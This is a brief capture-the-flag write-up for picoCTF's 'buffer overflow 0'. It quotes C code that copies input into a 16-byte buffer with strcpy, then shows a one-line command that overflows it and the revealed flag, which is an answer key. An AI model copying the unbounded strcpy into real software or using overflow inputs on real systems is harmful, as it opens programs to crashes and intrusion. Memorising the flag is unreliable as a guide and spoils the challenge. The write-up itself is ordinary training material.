#buffer overflow 0

Good 'Ol Buffalo this is nice way to start out lets take a look at the source, specifically:
```
void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}
```
A sigsegv_handler? let's nuke that buffer!
```
$ ./vuln $python '-c print("A"*300)'
picoCTF{ov3rfl0ws_ar3nt_that_bad_3598a894}
```
It worked! lets move on!
